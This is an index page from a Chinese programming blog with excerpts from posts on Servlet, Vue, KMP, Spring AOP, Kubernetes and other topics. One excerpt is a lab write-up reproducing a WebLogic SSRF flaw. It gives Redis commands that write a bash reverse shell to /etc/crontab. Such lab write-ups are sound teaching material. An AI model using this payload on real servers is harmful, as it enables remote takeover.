<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程爱好者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程爱好者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bchobby.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程爱好者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程爱好者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/27499fc490d85188df288d1f8ca22374/" rel="bookmark">
			Servlet 快速入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考博客 1.创建web项目，导入Servlet 依赖 这里创建项目没有使用框架
①创建项目
File——&gt;New——&gt; Project——&gt;Maven——&gt;Next——&gt;(自己定义的项目名字)——&gt; Finish
②导入依赖
&lt;!--需要将文件打成war包--&gt; &lt;packaging&gt;war&lt;/packaging&gt; &lt;!-- 导入servlet和jsp的依赖 --&gt; &lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api --&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;version&gt;3.1.0&lt;/version&gt; // 注意这里的 &lt;version&gt;3.1.0&lt;/version&gt; 要写成3.1.0 版本 不然后面的 @WebServlet("/Demo1") 会出错 &lt;/dependency&gt; &lt;/dependencies&gt; &lt;!--导入Tomcat 插件--&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.tomcat.maven&lt;/groupId&gt; &lt;artifactId&gt;tomcat7-maven-plugin&lt;/artifactId&gt; &lt;version&gt;2.2&lt;/version&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; 2.添加Web框架支持 选中刚刚创建的项目，右击，选择Add Framework Support...（添加框架支持）如图所示：
接下来选中web应用程序，并确认版本为4.0，如图所示：
点击确认后，即添加web框架完成。这样可以保证web.xml里面的配置文件的版本为最新的。
在这里添加框架如果不能被找到，可能因为某些操作导致未完全添加web支持.但IDEA判断你有web 支持,所以不会显示
在工程中把web相关删除干净,就可以重新添加支持了
点击File-&gt; Project Structure
在Facets 里面看到的Web项目直接进行删除就可以了
3.创建:定义一个类,实现Servlet接口,并重写接口中所有方法,并在service方法中输入一句话 package com.ting.web; import javax.jws.WebService; import javax.servlet.*; import javax.servlet.annotation.WebServlet; import java.io.IOException; // Servlet 如果想要被访问必须配置访问的路径 @WebServlet("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/27499fc490d85188df288d1f8ca22374/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2406b2b53feea7b961afb9f17da0a509/" rel="bookmark">
			weblogic SSRF漏洞复现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		漏洞描述 weblogic中存在一个ssrf漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。
影响版本：10.0.2 – 10.3.6
环境搭建 靶机：172.16.10.12
kali：172.16.10.1
进入vulhub-master/weblogic/ssrf目录
docker-compose up -d 服务启动后，访问http://172.16.10.12:7001/uddiexplorer，无需登录即可查看uddiexplorer应用。
漏洞复现 SSRF漏洞位于http://192.168.42.145:7001/uddiexplorer/SearchPublicRegistries.jsp，点击search按钮，用burp抓包
发送到repeater，更改operator参数的值为127.0.0.1:7001，得到错误，一般是返回status code
将operator参数的值改为127.0.0.1:80，不存在的端口，返回could not connect over HTTP to server
注入HTTP头，利用Redis反弹shell 进入容器查看一下ip
docker exec -it 4d28eed97e76 /bin/bash web服务器的真实IP是172.22.0.3
docker exec -it 46bfd2a29701 /bin/bash redis服务器的真实IP是172.22.0.2
使用ssrf探测一下redis服务器，返回Received a reponse，表明redis服务存在
接下来在http头注入三条redis命令，将反弹shell脚本写入/etc/crontab
test set 1 "\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c 'sh -i &gt;&amp; /dev/tcp/172.16.10.1/22111 0&gt;&amp;1'\n\n\n\n" config set dir /etc/ config set dbfilename crontab save test 进行url编码，注意换行符是"\r\n"，也就是"%0D%0A"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2406b2b53feea7b961afb9f17da0a509/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/271a3cd75e114051437287fa0e0a69cd/" rel="bookmark">
			Vue 脚手架创建项目
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		操作指导：右键文件在集成终端中打开，并输入创建脚手架命令[ vue create 文件名(英文) ]初始化项目 ，空格键为选择，enter键为下一步
1. Manually select features（手动选择配置项,勾选router、vuex、css预处理） √ Choose Vue version√ BabelTypeScriptProgressive Web App (PWA) Support√ Router√ Vuex√ CSS Pre-processorsLinter / FormatterUnit TestingE2E Testing 2. Choose a version of Vue.js that you want to start the project with (Use arrow keys) 选择vue版本，这里选择vue2
√ 2.x3.x 3.Use history mode for router? (Requires proper server setup for index fallback in production) (Y/n) 路由模式是否用history,这里选否。 默认用hash模式
n 4. Pick a CSS pre-processor (PostCSS, Autoprefixer and CSS Modules are supported by default): (Use arrow keys) 选择你的css预处理语言，这里选less
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/271a3cd75e114051437287fa0e0a69cd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/83249c8612157b91d2a359b84144bf89/" rel="bookmark">
			求字符串中循环子串的长度 ← KMP算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【题目来源】
改编自：https://www.luogu.com.cn/problem/P4391
【问题描述】
给你一个字符串 s1​，它是由某个字符串 s2​ 不断自我连接形成的。但是字符串 s2​ 是不确定的，现在只想知道它的最短长度是多少。
【输入格式】
仅一行，表示输入字符串 s1​ 的一个子串。
【输出格式】
仅一行，表示 s2​ 的最短长度。
【说明/提示】
样例cabcabca的解释：对于样例，我们可以利用abc不断自我连接得到abcabcabc，读入的cabcabca是它的子串。
【规模与约定】
对于全部的测试点，保证字符串的长度 ≤10^6 。
【算法分析】
首先要注意，本题输入的字符串比较特殊，是由某个字符串不断自我连接构成的某个字符串的子串。在这个基础上，绘制样例 cabcabca 的前缀表及next数组如下文示意图所示。
由 https://blog.csdn.net/hnjzsyjyj/article/details/127171330 知，前缀表与next数组虽然是有关系的，但是它们不是一回事。且next数组可通过“将前缀表每一位都向右移动1位（最右位舍去）并在最左位补一个-1”得到。
观察示意图可知，循环子串的长度为：T.length()-ne[T.length()]
【算法代码】
#include&lt;iostream&gt; using namespace std; const int maxn=100; int ne[maxn]; void getNext(string T) { int len=T.length(); int i=0, j=-1; ne[0]=-1; while(i&lt;len) { if(j==-1 || T[i]==T[j]) { ne[++i]=++j; } else j=ne[j]; } } int main() { string T; getline(cin,T); getNext(T); cout&lt;&lt;(T.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/83249c8612157b91d2a359b84144bf89/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/464e72d76b616ecdbc27d8581fb9a2a9/" rel="bookmark">
			组合优化求解方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 离散优化/整数规划 整数规划，或者离散优化（Discrete Optimization），是指数学规划问题中自变量存在整数。
混合整数规划（Mixed Integer Programming, MIP），即自变量既包含整数也有连续变量
求解复杂度 求解整数规划的精确解是NP难的，也就是指数级算法复杂度（Exponential Time Solvable）
假设这里的整数是0,1变量，那么我们可以简单地理解为算法复杂度是2n（需要解2n个线性规划问题）。也就是说，每增加一个0，1变量，求解的速度就有可能要增加一倍！例如求解n=100的整数规划问题需要1小时，那么求解n=101的规模可能会需要2小时，n=102需要4小时，n=105需要32小时。。这就是指数爆炸！
其它解决方案 近似算法（Approximation Algorithms），启发式算法（Heuristic Algorithms），遗传算法（Evolution Algorithms, Meta-Heuristic）等等。它们虽然不能求得整数规划的最优解，但是却能在短时间（通常多项式时间）内给出一个较好的可行解
组合优化是整数规划的子集。的确，绝大多数组合优化问题都可以被建模成（混合）整数规划模型来求解
2. 组合优化求解方法： 精确方法——无法应用于大规模实例近似算法——本质上都是贪心算法，而且通常都是多项式时间的算法启发式方法——以问题为导向（通常依赖于人工选取 heuristics； –难以调整何时何地应用 heuristics； 般只能求得局部最优解；启发式算法的设计过程需要特殊的领域知识，并可能需要反复试验来调整算法。实际上，每当问题设置变化时，算法通常需要被重新修订，这需要我们重新优化系统，故而启发式算法在这时变得不切实际）元启发算法——如遗传算法、蚁群算法、进化算法、智能算法；可以将它当作一个黑箱子对几乎任何问题适用；可以控制算法的迭代次数神经网络RL方法 3. 元启发算法Meta-heuristic 也被称为智能优化算法(Intelligent optimization algorithm)
举例： (1) 遗传算法； 遗传算法以一种群体中的所有个体为对象，并利用随机化技术指导对一个被编码的参数空间进行高效搜索。其中，选择、交叉和变异构成了遗传算法的遗传操作；参数编码、初始群体的设定、适应度函数的设计、遗传操作设计、控制参数设定五个要素组成了遗传算法的核心内容。
种群——由经过基因（gene）编码的一定数目的个体(individual)组成个体——是染色体(chromosome)；遗传物质的主要载体，即多个基因的集合由于仿照基因编码的工作很复杂，我们往往进行简化，如二进制编码染色体长度为二进制编码的长度。chromosomes 每一条染色体是一个字典，该字典有两个内容，分别是包含基因的Gene类和适应度函数值fitness 初代种群产生之后，按照适者生存和优胜劣汰的原理，逐代（generation）演化产生出越来越好的近似解，在每一代，根据问题域中个体的适应度（fitness）大小选择（selection）个体，并借助于自然遗传学的遗传算子（genetic operators）进行组合交叉（crossover）和变异（mutation），产生出代表新的解集的种群。这个过程将导致种群像自然进化一样的后生代种群比前代更加适应于环境，末代种群中的最优个体经过解码（decoding），可以作为问题近似最优解。
生物学术语
基因型(genotype)：性状染色体的内部表现；表现型(phenotype)：染色体决定的性状的外部表现，或者说，根据基因型形成的个体的外部表现；进化(evolution)：种群逐渐适应生存环境，品质不断得到改良。生物的进化是以种群的形式进行的。适应度(fitness)：度量某个物种对于生存环境的适应程度。选择(selection)：以一定的概率从种群中选择若干个个体。一般，选择过程是一种基于适应度的优胜劣汰的过程。复制(reproduction)：细胞分裂时，遗传物质DNA通过复制而转移到新产生的细胞中，新细胞就继承了旧细胞的基因。交叉(crossover)：两个染色体的某一相同位置处DNA被切断，前后两串分别交叉组合形成两个新的染色体。也称基因重组或杂交；变异(mutation)：复制时可能（很小的概率）产生某些复制差错，变异产生新的染色体，表现出新的性状。编码(coding)：DNA中遗传信息在一个长链上按一定的模式排列。遗传编码可看作从表现型到基因型的映射。解码(decoding)：基因型到表现型的映射。个体（individual）：指染色体带有特征的实体；种群（population）：个体的集合，该集合内个体数称为种群 遗传算法的一般步骤：
随机产生种群。根据策略判断个体的适应度，是否符合优化准则，若符合，输出最佳个体及其最优解，结束。否则，进行下一步。依据适应度选择父母，适应度高的个体被选中的概率高，适应度低的个体被淘汰。用父母的染色体按照一定的方法进行交叉，生成子代。对子代染色体进行变异。 选择算子
轮盘赌选择（Roulette Wheel Selection）随机竞争选择（Stochastic Tournament）最佳保留选择无回放随机选择（也叫期望值选择Excepted Value Selection）确定式选择…… 遗传算法的缺点
1、遗传算法的编程实现比较复杂,首先需要对问题进行编码,找到最优解之后还需要对问题进行解码,
2、另外三个算子的实现也有许多参数,如交叉率和变异率,并且这些参数的选择严重影响解的品质,而目前这些参数的选择大部分是依靠经验.
3、没有能够及时利用网络的反馈信息,故算法的搜索速度比较慢，要得要较精确的解需要较多的训练时间。
4、算法对初始种群的选择有一定的依赖性，能够结合一些启发算法进行改进。
5、算法的并行机制的潜在能力没有得到充分的利用，这也是当前遗传算法的一个研究热点方向。
常用混合遗传算法，合作型协同进化算法等来替代，这些算法都是GA的衍生算法。
(2) 粒子群算法PSO； PSO算法主要应用于连续问题，包括神经网络训练和函数优化等，而GA除了连续问题之外，还可应用于离散问题，比如TSP问题、货郎担问题、工作车间调度等
(3) 禁忌搜索算法；
(4) 蚁群算法；
(5) 人工蜂群算法；
(6) 模拟退火算法；*
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/464e72d76b616ecdbc27d8581fb9a2a9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/061fa196936d82d16830e490b0d3bff0/" rel="bookmark">
			qt qchart绘制简单股票
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原始数据来自公开的链接
解析代码:
#include "StockDataReader.h" #include &lt;QtSql&gt; #include &lt;QApplication&gt; #include &lt;QString&gt; //#include "../StockAnalyse/StockAnalyse_global.h" //#include "../StockAnalyse/stockanalyse.h" // 静态成员变量需要在类体的外面进行初始化 //StocksDataReader* StocksDataReader::m_pInstance = NULL; StocksDataReader* StocksDataReader::m_pInstance=NULL; QMutex StocksDataReader::m_Mutex; static QString strhttp_kline = "https://quotes.sina.cn/cn/api/json_v2.php/CN_MarketDataService.getKLineData?symbol="; //绘制实时的分时图需要下列两个网址相结合，腾讯的网址获取今日的历史分时图，新浪的网址实时的该股票行情，进行对今日分时图刷新 //http://data.gtimg.cn/flashdata/hushen/minute/sz000001.js?maxage=110&amp;0.28163905744440854 static QString strhttp_realtime = "http://hq.sinajs.cn/list="; static QString strhttp_timeline = "http://data.gtimg.cn/flashdata/hushen/minute/"; static QString strhttp_4daytimeline = "http://data.gtimg.cn/flashdata/hushen/4day/"; //+sz/或sh/ //https://web.ifzq.gtimg.cn/appstock/app/minute/query?code=sh600519 //新的链接 static QString strhttp_timeline_new = "https://web.ifzq.gtimg.cn/appstock/app/minute/query?code="; static QString strhttp_4daytimeline_new = "https://web.ifzq.gtimg.cn/appstock/app/day/query?code="; //获取最新行情 static QString strhttp_realtime_all = "http://qt.gtimg.cn/q=";//sh600000,sz000001 sh500038 //可以选这个数据多，不用计算可以直接用 //获取实时资金流向 //http://qt.gtimg.cn/q=ff_sh600519 //参考链接https://www.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/061fa196936d82d16830e490b0d3bff0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/696ccdf32d641706ddbc34d0bc42e286/" rel="bookmark">
			spring boot整合AOP实现日志功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		spring boot整合AOP实现日志功能 AOP简介 AOP (Aspect Oriented Programing) 面向切面编程 = Spring动态代理开发
以切面为基本单位的程序开发，通过切面间的彼此协同，相互调用，完成程序的构建
切面 = 切入点 + 额外功能
OOP (Object Oritened Programing) 面向对象编程 Java
以对象为基本单位的程序开发，通过对象间的彼此协同，相互调用，完成程序的构建
POP (Producer Oriented Programing) 面向过程(方法、函数)编程 C
以过程为基本单位的程序开发，通过过程间的彼此协同，相互调用，完成程序的构建
AOP的概念 AOP的概念：
本质就是Spring得动态代理开发，通过代理类为原始类增加额外功能。
好处：利于原始类的维护
注意：AOP编程不可能取代OOP，OOP编程有意补充。
结合AOP，实现日志功能 参考ruoyi
注解类 package indi.yuluo.xojbackgroundmanagmentsystem.annotation; import indi.yuluo.xojbackgroundmanagmentsystem.Enum.BusinessType; import java.lang.annotation.*; /** * @Author: yuluo * @CreateTime: 2022-10-01 17:21 * @Description: TODO */ @Target({ ElementType.PARAMETER, ElementType.METHOD, ElementType.TYPE }) // 注解放置的目标位置,PARAMETER: 可用在参数上 METHOD：可用在方法级别上 @Retention(RetentionPolicy.RUNTIME) // 指明修饰的注解的生存周期 RUNTIME：运行级别保留 @Documented public @interface Log { /** * 模块 */ String title() default "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/696ccdf32d641706ddbc34d0bc42e286/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9f6de554ff62399ad38e8b01fcb8b7b3/" rel="bookmark">
			【MybatisPlus】MP的分页查询、多条件查询以及查询过程中解决null的空值判定
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一.分页处理1.调用方法传入参数获取返回值2.设置分页拦截器 二.条件查询2.1通过QueryWrapper对象来执行分页查询2.2在QueryWrapper对象的基础上使用lambda表达式2.3直接通过LambdaQueryWrapper对象 三.多条件查询3.1且的情况3.2或的情况 四.null判定 前言 MP这样一款强大的持久层框架处理起来复杂的SQL来也是得心应手，效率极高，快快与我一同领略Plus的独特魅力吧
一.分页处理 1.调用方法传入参数获取返回值 创建IPage分页对象,设置分页参数,1为当前页码，3为每页显示的记录数，执行分页查询并获取其结果
@SpringBootTest class Mybatisplus{ @Autowired private UserDao userDao; //分页查询 @Test void testSelectPage(){ IPage&lt;User&gt; page=new Page&lt;&gt;(1,3); userDao.selectPage(page,null); System.out.println("当前页码值："+page.getCurrent()); System.out.println("每页显示数："+page.getSize()); System.out.println("一共多少页："+page.getPages()); System.out.println("一共多少条数据："+page.getTotal()); System.out.println("数据："+page.getRecords()); } } 2.设置分页拦截器 将MP提供的分页拦截器配置成Spring管理的bean对象
@Configuration public class MybatisPlusConfig { @Bean public MybatisPlusInterceptor mybatisPlusInterceptor(){ //1 创建MybatisPlusInterceptor拦截器对象 MybatisPlusInterceptor mpInterceptor=new MybatisPlusInterceptor(); //2 添加分页拦截器 mpInterceptor.addInnerInterceptor(new PaginationInnerInterceptor()); return mpInterceptor; } } 查询结果如下：
MP有多智能，他给我们提供的方法功能太强大，以至于我们只需传入两个对象即可自动完成分页查询
二.条件查询 2.1通过QueryWrapper对象来执行分页查询 @SpringBootTest class Mybatisplus{ @Autowired private UserDao userDao; @Test void testGetAll(){ QueryWrapper qw = new QueryWrapper(); qw.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9f6de554ff62399ad38e8b01fcb8b7b3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f76e9aeaae98a9de1965ccaecb3675d2/" rel="bookmark">
			单片机温湿度测量程序编程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CSDN话题挑战赛第2期
参赛话题：学习笔记
学习之路，长路漫漫，写学习笔记的过程就是把知识讲给自己听的过程。这个过程中，我们去记录思考的过程，便于日后复习，梳理自己的思路。学习之乐，独乐乐，不如众乐乐，把知识讲给更多的人听，何乐而不为呢?
博客写作背景----项目中解决的问题
公司有一个使用单片机多路采集温湿度的项目，还需要在上位机进行波形的查看，信号算法的处理，初步定为使用labview编写上位机程序进行处理。为啥用labview呢，因为LabVIEW是美国国家仪器公司（NI）的创新软件产品，其全称是实验室虚拟仪器工程平台（Laboratory Virtual Instrument Engineering Workbench），是一种基于G语言（Graphics Language，图形化编程语言）的测试系统软件开发平台。LabVIEW并不局限于虚拟仪器的开发，它的作用是为大型复杂测试系统提供通用的软件开发平台。目前，LabVIEW已经成为测试领域应用最广泛和最有前途的软件开发平台之一。
下面是我最近写程序的一些知识，进行了部分的整理，发出来和大家一起分享，也方便我以后查找自己的编程过程。
编程知识点–基于labview的温湿度测量
在多数情况下，测量温度的同时需要测量湿度，本节将介绍使用DHT11温湿度传感器、Arduino Uno和LabVIEW组成温湿度测量系统，可用于粮仓等场合的温湿度监控。
温湿度测量系统框图如图所示
在整个系统中，Arduino Uno作为下位机，负责DHT11的读写以及数据传输；LabVIEW编写的显示软件作为上位机；上下位机利用USB-TTL接口实现通信。
DHT11数字温湿度传感器，是一款含有已校准数字信号输出的温湿度复合传感器，采用专用的数字模块采集技术和温湿度传感技术，具有极高的可靠性与卓越的长期稳定性，内部包含一个电阻式感湿元件和一个NTC测温元件。DHT11传感器都经过实验室校准，校准系数以程序的形式储存在OTP内存中，传感器内部在检测信号的处理过程中要调用这些校准系数。采用单线制串行接口，超小的体积、极低的功耗，使系统集成变得简易快捷，信号传输距离可达20米以上
DHT11的供电电压为3.3～5V，测量范围为湿度20%～90%RH，温度0～50℃，测量精度为湿度±5%RH，温度±2℃，测量分辨率为湿度1%RH，温度1℃。需要注意的是，DHT11传感器上电之后，要等待1s以越过不稳定状态，在此期间无需发送任何指令。电源引脚（VCC，GND）之间可增加一个100nF的电容，用以去耦滤波。引脚说明如表所示DOUT用于微处理器与DHT11之间的通信和同步，采用单总线数据格式，一次通信时间4ms左右。主机发送一次开始信号后，DHT11从低功耗模式转换到高速模式，等待主机开始信号结束后，DHT11发送响应信号，送出40bit的数据，并触发一次信号采集，主机可选择读取部分数据。在高速模式下，DHT11接收到开始信号即触发一次温湿度采集，如果没有接收到主机发送的开始信号，DHT11不会主动进行温湿度采集。
DHT11的Arduino库文件下载地址为：https://github.com/markruys/arduino-DHT。DHT11库文件有3个函数：dht.setup（int Pin）、dht.getHumidity()、dht.getTemperature()。
❑dht.setup(int Pin)：设置DHT11总线的连接管脚号，输入参数为所连接的管脚号，无返回参数。
❑dht.getHumidity()：获取DHT11的湿度值，无输入参数，返回值为湿度值，double类型。
❑dht.getTemperature()：获取DHT11的温度值，无输入参数，返回值为温度值，double类型。
如果使用的是DHT11模块，则将DHT11温湿度模块的VCC、GND、DOUT引脚分别接至Arduino Uno控制板上的+5V、GND、数字端口2。
如果使用的是DHT11传感器，则还需要在DOUT与VCC之间串联5kΩ的上拉电阻。温湿度测量系统硬件连接
LabVIEW上位机部分需要完成以下功能：
1）向下位机Arduino控制器发送温度采集命令，Arduino控制器通过串口接收上位机命令，完成温度数据的采集之后将数据回传，LabVIEW软件将回传的温度数据显示在前面板上；
2）向下位机Arduino控制器发送湿度采集命令，Arduino控制器通过串口接收上位机命令，完成湿度数据的采集之后将数据回传，LabVIEW软件将回传的湿度数据显示在前面板上。
LabVIEW上位机主程序的结构为顺序结构+While循环。首先，在顺序结构中的第一帧中，通过设置的串口号来初始化串口通信。然后，程序进入While循环和顺序结构，依次向Arduino Uno控制器发送温度和湿度测量的命令码，接收到返回的温度和湿度数据之后，显示在前面板上。最后，关闭串口通信。
为了保证通信的正确性，在数据帧中设置0x55和0xAA为校验帧，0x11为温度采集命令码，0x10为湿度采集命令码。LabVIEW上位机程序框图如图
通过USB电缆连接Arduino Uno控制器与计算机，使用高温烘烤DHT11温湿度传感器和向DHT11温湿度传感器的测试窗吹气，得到如图所示的测量结果。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/244c6ce1e6b3e2b031e423f97b10705c/" rel="bookmark">
			分享 | 一份小小的信念
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 写在前面：
7月末的时候整理了一次关于解忧和有间杂货店的故事，想把这个故事分享给更多的人~每次心情低落的时候，都会去翻一翻有间公众号里的文章，期待他们的APP和店铺可以再次上线~像是心里一份渺小又强大的信念感，当不开心走进解忧杂货店，遇到的是“浅浅的温暖”~“世界是需要我们的”，希望我们可以成为带来温暖与被温暖的人！ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/91449b233b78c731eeded9e473e0dffc/" rel="bookmark">
			二分查找-JS
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		二分查找-JS 题目 题解 /** * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可 * * * @param nums int整型一维数组 * @param target int整型 * @return int整型 */ function search(nums, target) { // write code here let low = 0, high = nums.length - 1; //当数组为空时 if(nums.length == 0){ return -1 } while (low &lt;= high) { let mid = Math.floor((low + high) / 2); if (nums[mid] == target) { return mid; } else if (nums[mid] &gt; target) { high = mid-1; } else if (nums[mid] &lt; target) { low = mid+1; } } return -1; } module.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/91449b233b78c731eeded9e473e0dffc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3ba27d171d9c93da089cfc6613c769fa/" rel="bookmark">
			leetcode练习笔记2022年9月
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C语言常用函数库： 快速排序
&lt;stdlib&gt;: qsort 补充使用简介：
https://blog.csdn.net/ZDDWLIG/article/details/120209948
具体如下
普通数组二维数组二维指针数组 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int cmp1(const void*a, const void*b) { return (*((int*)a) - *((int*)b)); } int cmp2(const void*a, const void*b) { int *ax = (int*)a; int *bx = (int*)b; if(ax[0] != bx[0]) { return (ax[0] - bx[0]); } return (ax[1] - bx[1]); } int cmp3(const void*a, const void*b) { int *ax = *(int**)a; int *bx = *(int**)b; if(ax[0] != bx[0]) { return (ax[0] - bx[0]); } return (ax[1] - bx[1]); } int main() { printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3ba27d171d9c93da089cfc6613c769fa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d9af71ab0d6db212886a9c36550f3fcf/" rel="bookmark">
			K8S(kubernetes)学习（四）：K8S之Storage
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		kubernetes使用NFS共享存储有两种方式：
（1）手动方式静态创建所需要的PV和PVC（见本文1.3.2小节）。（2）通过创建PVC动态地申请PV（见本文1.4.2小节）。 一、Storage（/ˈstɔːrɪdʒ/） Volume地址：https://kubernetes.io/docs/concepts/storage/
1.1、Volume 1.1.1、Volume简介 volume（/ˈvɒljuːm/，IT词汇–百度百科）： 在电脑中， volume（文件集）是一个可辨认的数据存储（storage）单元。
Volume地址：https://kubernetes.io/docs/concepts/storage/volumes/
容器中的磁盘文件是临时的，这对于在容器中运行的非平凡（重大）应用程序会带来一些问题：
（1）容器崩溃时文件丢失。（2）Kubelet重新启动容器后为clean状态。 在Pod中一起运行的容器之间共享文件时，会出现第二个问题。
Kubernetes的Volume抽象地解决了这两个问题。
1.2.1、Host类型volume实战 思路： 查看volume挂载目录是否同步。
定义一个Pod，其中包含两个Container，都使用Pod的Volume。
（1）创建volume-pod.yaml 创建volume-pod.yaml：
[root@m test]# mkdir volume [root@m test]# cd volume [root@m volume]# vi volume-pod.yaml 内容：
apiVersion: v1 kind: Pod metadata: name: volume-pod spec: containers: - name: nginx-container image: nginx ports: - containerPort: 80 volumeMounts: - name: volume-pod mountPath: /nginx-volume - name: busybox-container image: busybox command: ['sh', '-c', 'echo The app is running!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d9af71ab0d6db212886a9c36550f3fcf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/96153c801b73dccbca48a8ba7aefdff7/" rel="bookmark">
			Caused by: java.net.BindException: Address already in use: bind
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		地址已经在使用:bind
端口已经被使用，看看使用的是哪个端口，如果是80端口，
使用cmd命令打开dos窗口运行netstat -ano|findstr 端口号 查看占用端口号的进程
使用taskkill -f -pid 进程id 结束该进程
如果出现拒绝访问无法终止进程，说明是权限不够，右键开始菜单打开搜索或者使用快捷键win+s打开搜索，输入cmd点击以管理员身份运行
再使用taskkill -f -pid 进程id 结束该进程就可以了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d0750172328626cbcf6cda5e24b2dc43/" rel="bookmark">
			Caused by: com.mysql.jdbc.exceptions.jdbc4.MySQLIntegrityConstraintViolationException:Duplicate entr
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		键“PRIMARY”的重复条目“1-1”
因为有两个主键，不能出现两个主键重复值。批量添加的话要先删除旧值
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b964e69dc08c9aac7a2610acfefbdd7c/" rel="bookmark">
			vue实战-产品详情页（轮播图、放大镜）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vue实战-产品详情页（轮播图、放大镜） 1.添加产品详情页的静态组件 因为它是路由组件，将其放入pages文件夹下。
注册路由组件
1）router中添加Detail的路由。
{ path:'/detail/:skuid', component:Detail, meta:{show:true} }, 2）在Search页面处的产品点击跳转处，设置声明式导航跳转
